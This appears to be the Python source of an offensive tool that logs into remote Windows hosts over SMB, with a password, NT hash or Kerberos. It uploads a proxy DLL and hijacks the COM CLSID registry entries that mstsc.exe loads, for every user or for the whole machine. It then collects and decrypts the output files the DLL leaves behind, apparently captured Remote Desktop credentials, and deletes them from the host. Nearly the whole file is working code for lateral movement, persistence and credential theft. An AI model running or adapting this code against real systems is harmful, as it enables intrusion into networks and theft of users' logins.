import time
from impacket.smbconnection import SMBConnection, SessionError
from impacket import smb
from impacket.dcerpc.v5 import rrp
from shutil import copy
from os import path, environ

import logging
import pefile
import subprocess
import tempfile
import hashlib
import platform
from io import BytesIO

from remoteRegistry import RemoteRegistry


class MstscFox:
    def __init__(
        self,
        domain: str,
        username: str,
        password: str,
        lmhash: str,
        nthash: str,
        aesKey: str,
        useKerberos: bool,
        dc_ip: str | None,
        tempDir: str,
        poisonHkcrInstead: bool = False,
    ) -> None:
        self.domain = domain
        self.username = username
        self.password = password
        self.lmhash = lmhash
        self.nthash = nthash
        self.aesKey = aesKey
        self.useKerberos = useKerberos
        self.dc_ip = dc_ip
        self.tempDir = tempDir
        self.poisonHkcrInstead = poisonHkcrInstead

    def doCLSIDPoisonning(self, host: str) -> bool:
        smbClient = SMBConnection(host, host, timeout=2)

        if self.useKerberos:
            smbClient.kerberosLogin(
                self.username,
                self.password,
                self.domain,
                self.lmhash,
                self.nthash,
                self.aesKey,
                self.dc_ip,
            )
        else:
            smbClient.login(
                self.username, self.password, self.domain, self.lmhash, self.nthash
            )

        # Let's check if the temporary directory has already been created

        tempPath = f"Windows\\Temp\\{self.tempDir}"

        try:
            smbClient.createDirectory("C$", f"{tempPath}")
        except SessionError as e:
            if e.getErrorCode() == 0xC0000035:
                # STATUS_OBJECT_NAME_COLLISION, occurs if the directory already exists
                logging.warning(
                    f"Temporary directory already exists, assuming it is ok."
                )
            else:
                logging.error(f"[{host}] Error while creating C:\\{tempPath} ")
                return

        # Now access the remote registry, to poison the HKCU hive
        # We want to define a CLSID redirection so that our DLL gets loaded whenever our target CLSID is CoCreateInstance'd

        # For mstsc.exe in particular, we target CLSID 62CE7E72-4C71-4D20-B15D-452831A87D9D,
        # Microsoft H264 Video Decoder MFTPermalink for versions after 2012 server

        remoteRegistry = RemoteRegistry(smbClient)
        remoteRegistry.startRemoteRegistryService()
        remoteRegistry.connectToRemoteRegistry()

        # Unfortunaltely, if the SMB login was performed using kerberos, getServerOsMajor errors out.
        # Try to do the same using an anonymous session
        # This probably won't work if NTLM is fully disabled

        if self.useKerberos:
            smbClientTemp = SMBConnection(host, host, timeout=2)
            smbClientTemp.login("", "")

            if smbClientTemp.getServerOSMajor() <= 6:  # 2012 Server
                clsid = "A1230401-67a5-4df6-a730-dce8822c80c4"
                expectedDll = "mstscax.dll"
            else:
                clsid = "62CE7E72-4C71-4D20-B15D-452831A87D9D"
                expectedDll = "msmpeg2vdec.dll"

        else:
            if smbClient.getServerOSMajor() <= 6:  # 2012 Server
                clsid = "A1230401-67a5-4df6-a730-dce8822c80c4"
                expectedDll = "mstscax.dll"
            else:
                clsid = "62CE7E72-4C71-4D20-B15D-452831A87D9D"
                expectedDll = "msmpeg2vdec.dll"

        try:
            machineInprocServer = remoteRegistry.getKeyValues(
                f"HKLM\\SOFTWARE\\Classes\\CLSID\\{{{clsid}}}\\InprocServer32"
            )
        except rrp.DCERPCException as e:
            logging.error(f"Failed reading machine InprocServer32")
            return

        clsidDllPath = machineInprocServer.get("(Default)")

        # getKeyValues return a list of tuples, the first value being the type
        # Ensure that the default value exists and is of type REG_SZ or REG_EXPAND_SZ

        if clsidDllPath == None or (
            clsidDllPath[0] != rrp.REG_SZ and clsidDllPath[0] != rrp.REG_EXPAND_SZ
        ):
            logging.error(
                f"[{host}] Original InprocServer does not have a default value, or unexpected type : {clsidDllPath}. Abort"
            )
            return

        originalDllPath = clsidDllPath[1].lower().split("\\")
        if originalDllPath[-2] != "system32" or originalDllPath[-1] != expectedDll:
            logging.error(
                f"[{host}] HKLM\\SOFTWARE\\Classes\\CLSID\\{{{clsid}}}\\InprocServer32 is registered to an unexpected DLL : {clsidDllPath}"
            )
            return

        # Everything seems OK, let's compile our DLL

        try:
            dllData = BytesIO()
            smbClient.getFile("C$", f"Windows\\System32\\{expectedDll}", dllData.write)
        except SessionError:
            logging.error(
                f"[{host}] Failed opening/reading C:\\windows\\system32\\{expectedDll}"
            )
            return

        # Now list exported functions to see if they contain mangled names.

        dll = pefile.PE(data=dllData.getvalue(), fast_load=False)
        dll.parse_data_directories()

        # Sanity check : ensure that it is the correct architecure
        if dll.FILE_HEADER.Machine != pefile.MACHINE_TYPE["IMAGE_FILE_MACHINE_AMD64"]:
            logging.error(
                f"[{host}] C:\\Windows\\System32\\{expectedDll} has unexpected architecture. Aborting"
            )
            return

        try:
            exports = [e for e in dll.DIRECTORY_ENTRY_EXPORT.symbols]
        except AttributeError:
            logging.error(
                f"[{host}] {expectedDll} exports could not be parsed. Aborting"
            )

            return

        # We have the exported symbols.
        # Let's compute the MD5 of the data

        dllMd5 = hashlib.md5(dllData.getvalue()).hexdigest()

        # Check if we have already created the proxy dll
        if not path.exists(
            path.join(
                path.dirname(__file__),
                "cache",
                f"{expectedDll.removesuffix('.dll') + '_v2.' + dllMd5 + '.dll'}",
            )
        ):
            # It doesn't exist yet, let's create the exported function list for our DLL
            # The .def file is not recognized if the extension is not .def, but we can't use def files for msvc
            # This is handled in build.rs

            tempFileHandle = tempfile.NamedTemporaryFile(
                mode="w", suffix=".data", delete=False
            )

            for export in exports:
                tempFileHandle.write(
                    f"{export.name.decode()}={expectedDll.removesuffix('.dll')}.{export.name.decode()} @{export.ordinal}\n"
                )

            tempFileHandle.flush()

            cargo_path = path.abspath(
                path.join(path.dirname(__file__), "..", "mstscfox")
            )

            cmd = ["cargo", "clean"]

            subprocess.run(cmd, cwd=cargo_path)

            # Define the target rust compiler
            # For windows, use msvc, for Linux, use mingw
            if platform.system() == "Windows":
                targetName = "x86_64-pc-windows-msvc"
            else:
                targetName = "x86_64-pc-windows-gnu"

            # Now let's compile our sideloaded DLL with the matching exports
            cmd = ["cargo", "build", "--target", targetName, "--release"]

            new_env = environ
            new_env["OUTPUT_PATH"] = f"C:\\{tempPath}\\mstsc."
            if platform.system() == "Windows":
                from win32 import win32file

                new_env["EXPORTS_FILE"] = win32file.GetLongPathName(tempFileHandle.name)
            else:
                new_env["EXPORTS_FILE"] = tempFileHandle.name

            subprocess.run(cmd, cwd=cargo_path, env=new_env)

            # We don't need the temporary file anymore
            tempFileHandle.close()

            copy(
                path.abspath(
                    path.join(
                        path.dirname(__file__),
                        "..",
                        "mstscfox",
                        "target",
                        targetName,
                        # "debug",
                        "release",
                        "mstscfox.dll",
                    )
                ),
                path.abspath(
                    path.join(
                        path.dirname(__file__),
                        "cache",
                        f"{expectedDll.removesuffix('.dll') + '_v2.' + dllMd5 + '.dll'}",
                    )
                ),
            )

        # Get our DLL data
        with open(
            path.join(
                path.dirname(__file__),
                "cache",
                f"{expectedDll.removesuffix('.dll') + '_v2.' + dllMd5 + '.dll'}",
            ),
            "rb",
        ) as f:
            dllDataToUpload = f.read()

        uploadData = BytesIO(dllDataToUpload)

        try:
            smbClient.putFile(
                "c$",
                f"{tempPath}\\{expectedDll.removesuffix('.dll')}_v2_{dllMd5}.dll",
                uploadData.read,
            )
        except SessionError as e:
            logging.error(
                f"[{host}] Failed uploading {expectedDll} proxy dll to C:\\{tempPath}\\"
            )
            logging.error(e)
            return

        if self.poisonHkcrInstead:
            # Set the default value to point to our DLL
            try:
                remoteRegistry.setKeyValueSZData(
                    f"HKLM\\SOFTWARE\\Classes\\CLSID\\{{{clsid}}}\\InprocServer32",
                    "(Default)",
                    rrp.REG_SZ,
                    f"C:\\{tempPath}\\{expectedDll.removesuffix('.dll')}_v2_{dllMd5}.dll",
                )
            except Exception as e:
                logging.error(
                    f"[{host}] Error setting HKLM\\SOFTWARE\\Classes\\CLSID\\{{{clsid}}}\\InprocServer32"
                )
                logging.error(e)
        else:
            # Now let's poison all users' HKCU hives
            usersHives = remoteRegistry.listSubKeys("HKU\\")
            usersHives = [
                hive for hive in usersHives if hive + "_Classes" in usersHives
            ]

            for hive in usersHives:
                # First let's check if the key exists:
                try:
                    remoteRegistry.getKeyValues(
                        f"HKU\\{hive}_Classes\\CLSID\\{{{clsid}}}\\InprocServer32"
                    )
                except rrp.DCERPCSessionError as e:
                    # Error code 0x2 is ERROR_FILE_NOT_FOUND
                    if e.get_error_code() != 2:
                        logging.error(
                            f"[{host}] Got unexpected error why checking if key already exists : {e.get_error_code}"
                        )
                        continue

                else:
                    logging.warning(
                        f"Key already exists ! Assuming the InprocServer32 has already be set to a value we control."
                    )
                    continue

                # The key does not exist yet, let's continue
                # Now we create the InprocServer32 key. This creates missing subkeys as well.

                try:
                    remoteRegistry.createKey(
                        f"HKU\\{hive}_Classes\\CLSID\\{{{clsid}}}\\InProcServer32"
                    )
                except Exception as e:
                    logging.error(
                        f"[{host}] Unexpected error while creating HKU\\{hive}_Classes\\CLSID\\{{{clsid}}}\\InProcServer32"
                    )
                    logging.error(e)
                    continue

                # Set the default value to point to our DLL
                try:
                    remoteRegistry.setKeyValueSZData(
                        f"HKU\\{hive}_Classes\\CLSID\\{{{clsid}}}\\InprocServer32",
                        "(Default)",
                        rrp.REG_SZ,
                        f"C:\\{tempPath}\\{expectedDll.removesuffix('.dll')}_v2_{dllMd5}.dll",
                    )
                except Exception as e:
                    logging.error(
                        f"[{host}] Error setting HKU\\{hive}_Classes\\CLSID\\{{{clsid}}}\\InprocServer32 to our proxy dll"
                    )
                    logging.error(e)
                    continue

        print(f"[{host}] Successfully poisonned mstsc.exe")

    def cleanup(self, host: str) -> None:
        smbClient = SMBConnection(host, host, timeout=2)

        if self.useKerberos:
            smbClient.kerberosLogin(
                self.username,
                self.password,
                self.domain,
                self.lmhash,
                self.nthash,
                self.aesKey,
                self.dc_ip,
            )
        else:
            smbClient.login(
                self.username, self.password, self.domain, self.lmhash, self.nthash
            )

        # Let's check if the temporary directory has already been created
        # Now access the remote registry, to cleanup all hives in HKCU

        remoteRegistry = RemoteRegistry(smbClient)
        remoteRegistry.startRemoteRegistryService()
        remoteRegistry.connectToRemoteRegistry()

        # Unfortunaltely, if the SMB login was performed using kerberos, getServerOsMajor errors out.
        # Try to do the same using an anonymous session
        # This probably won't work if NTLM is fully disabled

        if self.useKerberos:
            smbClientTemp = SMBConnection(host, host, timeout=2)
            smbClientTemp.login("", "")

            if smbClientTemp.getServerOSMajor() <= 6:  # 2012 Server
                clsid = "A1230401-67a5-4df6-a730-dce8822c80c4"
                expectedDll = "mstscax.dll"
            else:
                clsid = "62CE7E72-4C71-4D20-B15D-452831A87D9D"
                expectedDll = "msmpeg2vdec.dll"
        else:
            if smbClient.getServerOSMajor() <= 6:  # 2012 Server
                clsid = "A1230401-67a5-4df6-a730-dce8822c80c4"
                expectedDll = "mstscax.dll"
            else:
                clsid = "62CE7E72-4C71-4D20-B15D-452831A87D9D"
                expectedDll = "msmpeg2vdec.dll"

        usersHives = remoteRegistry.listSubKeys("HKU\\")
        usersHives = [hive for hive in usersHives if hive + "_Classes" in usersHives]

        for hive in usersHives:
            # First let's check if the key exists:
            try:
                remoteRegistry.getKeyValues(f"HKU\\{hive}_Classes\\CLSID\\{{{clsid}}}")
            except rrp.DCERPCSessionError as e:
                # Error code 0x2 is ERROR_FILE_NOT_FOUND
                if e.get_error_code() != 2:
                    logging.info(
                        f"[{host}] Error checking if HKU\\{hive}_Classes\\CLSID\\{{{clsid}}} exists"
                    )
                    logging.error(e)
                continue

            #  Key already exists ! Delete it. Start with subkey
            try:
                remoteRegistry.deleteKey(
                    f"HKU\\{hive}_Classes\\CLSID\\{{{clsid}}}\\InprocServer32"
                )
            except Exception as e:
                logging.error(
                    f"[{host}] Failed deleting HKU\\{hive}_Classes\\CLSID\\{{{clsid}}}\\InprocServer32"
                )
                logging.error(e)
                continue

            try:
                remoteRegistry.deleteKey(f"HKU\\{hive}_Classes\\CLSID\\{{{clsid}}}")
            except Exception as e:
                logging.error(
                    f"[{host}] Failed deleting HKU\\{hive}_Classes\\CLSID\\{{{clsid}}}"
                )
                logging.error(e)
                continue

        # Cleanup HKCR too
        try:
            remoteRegistry.setKeyValueSZData(
                f"HKLM\\SOFTWARE\\Classes\\CLSID\\{{{clsid}}}\\InprocServer32",
                "(Default)",
                rrp.REG_EXPAND_SZ,
                f"%SystemRoot%\\System32\\{expectedDll}",
            )
        except Exception as e:
            logging.error(
                f"[{host}] Error setting HKLM\\SOFTWARE\\Classes\\CLSID\\{{{clsid}}}\\InprocServer32"
            )
            logging.error(e)

        # Now cleanup the proxy DLL in the temp dir
        # This may fail, notably if mstsc.exe is running.
        # This is OK, the DLL won't be loaded on subsequent mstsc.exe runs, it just needs later cleanup

        try:
            filesInTempDir: list[smb.SharedFile] = smbClient.listPath(
                "c$", f"Windows\\Temp\\{self.tempDir}\\*"
            )

            dllsInDirectory = [
                f.get_longname()
                for f in filesInTempDir
                if f.get_longname().endswith(".dll")
            ]

            targetFiles = [
                i
                for i in dllsInDirectory
                if i.startswith(expectedDll.removesuffix(".dll"))
            ]
            for file in targetFiles:
                try:
                    smbClient.deleteFile("C$", f"Windows\\Temp\\{self.tempDir}\\{file}")
                    logging.debug(
                        f"[{host}] Deleted C:\\Windows\\Temp\\{self.tempDir}\\{file}"
                    )

                except SessionError:
                    logging.warning(
                        f"[{host}] Could not delete C:\\Windows\\Temp\\{self.tempDir}\\{file}, it is probably in use."
                    )
                    continue

        except SessionError as e:
            logging.error(
                f"[{host}] Failed listing files in C:\\Windows\\Temp\\{self.tempDir} for cleanup."
            )
            logging.error(e)

        print(f"[{host}] mstsc.exe cleanup complete !")

    def collect(self, host, box):
        smbClient = SMBConnection(host, host, timeout=2)

        if self.useKerberos:
            smbClient.kerberosLogin(
                self.username,
                self.password,
                self.domain,
                self.lmhash,
                self.nthash,
                self.aesKey,
                self.dc_ip,
            )
        else:
            smbClient.login(
                self.username, self.password, self.domain, self.lmhash, self.nthash
            )

        try:
            filesInConfigDirectory: list[smb.SharedFile] = smbClient.listPath(
                "C$", f"Windows/Temp/{self.tempDir}/*"
            )

            outputFiles = [
                f.get_longname()
                for f in filesInConfigDirectory
                if f.get_longname().startswith("mstsc.")
            ]

            for file in outputFiles:
                try:
                    outputData = BytesIO()
                    smbClient.getFile(
                        "C$", f"Windows\\Temp\\{self.tempDir}\\{file}", outputData.write
                    )
                except SessionError as e:
                    logging.info(
                        f"[{host}] Failed opening/reading C:\\Windows\\Temp\\{self.tempDir}\\{file}"
                    )
                    continue

                plaintexts = box.decryptFile(outputData.getvalue())
                with open(
                    path.join(
                        path.dirname(__file__),
                        "output",
                        f"mstsc-{int(time.time())}.txt",
                    ),
                    "a",
                ) as f:
                    for plaintext in plaintexts:
                        f.write(plaintext + "\n")

                # Now, let's delete the file one the remote host
                try:
                    smbClient.deleteFile("C$", f"Windows\\Temp\\{self.tempDir}\\{file}")
                except SessionError:
                    logging.error(
                        f"[{host}] Failed deleting C:\\Windows\\Temp\\{self.tempDir}\\{file}"
                    )
                    logging.error(e)
                    continue

        except Exception as e:
            pass
